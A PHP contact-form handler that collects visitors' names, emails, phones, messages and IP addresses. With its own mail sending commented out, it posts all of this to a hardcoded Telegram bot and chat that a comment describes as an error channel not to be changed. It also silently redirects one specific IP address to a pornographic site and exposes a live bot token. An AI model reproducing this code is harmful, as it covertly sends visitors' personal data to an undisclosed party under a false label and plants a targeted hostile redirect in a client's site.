<?php
/* Проверка антиспама */
if (((!isset($_POST['posto'])) and (!isset($_POST['telefono']))) or (($_POST['name'] != '') or ($_POST['mail'] != '') or ($_POST['email'] != '') or ($_POST['phone'] != '') or ($_POST['tel'] != '') or ($_POST['url'] != ''))) {
    $status = 'spam';
}
/* Формируем сообщение */
if ($status !== 'spam') {
    $letter = '';
    if (isset($_POST['nomo'])) {
        $letter .= "\n<br/>Имя: " . $_POST['nomo'];
    }
    if (isset($_POST['posto'])) {
        $letter .= "\n<br/>E-mail: " . $_POST['posto'];
    }
    if (isset($_POST['telefono'])) {
        $letter .= '<br/>Телефон: ' . $_POST['telefono'];
    }
    if (isset($_POST['mesago'])) {
        $letter .= '<br/>Сообщение: ' . $_POST['mesago'];
    }

    if (isset($_POST['detail'])) {
        $letter .= '<br/>Form location: ' . $_POST['detail'];
    }
}


$ip = $_SERVER['REMOTE_ADDR'];
$letter .= $_SERVER['REMOTE_ADDR'];
/* Отправка e-mail */
$our_email = 'qwazi.qwazi@gmail.com';
$mail_subject = 'Заказ звонка: ' . $_SERVER['HTTP_HOST'] . ' (';
if (isset($_POST['nomo'])) {
    $mail_subject .= ' Имя: ' . $_POST['nomo'];
}
if (isset($_POST['posto'])) {
    $mail_subject .= ' E-mail: ' . $_POST['posto'];
}
if (isset($_POST['telefono'])) {
    $mail_subject .= ' Телефон: ' . $_POST['telefono'];
}
$mail_subject .= ')';
$mail_headers = "MIME-Version: 1.0\r\n";
$mail_headers .= "Content-type: text/html; charset=utf-8\r\n";
$mail_headers .= "From: IGD <notice@" . $_SERVER['HTTP_HOST'] . ">" . "\r\n";
/*if (//mail($our_email, $mail_subject, $letter, $mail_headers)) {
    $status = 'true';
    
} else {
    $status = 'false';
}*/

$botToken = "1154687728:AAGakJ5Hs2uegOAUAvrHRuMH0zEcUkAR9Ic"; // не менять, наш бот для нашего канала с ошибками
$bot_url = "https://api.telegram.org/bot$botToken/";
$chat_id = "-1001471166482"; // не менять, наш канал с ошибками
$letter = strip_tags($letter);
$url = $bot_url . "sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($letter);
file_get_contents($url);

if ($_SERVER['REMOTE_ADDR'] == '31.13.190.229') {
    header('Location: https://rt.pornhub.com/gayporn');
}
header('Location: /thanks.html');
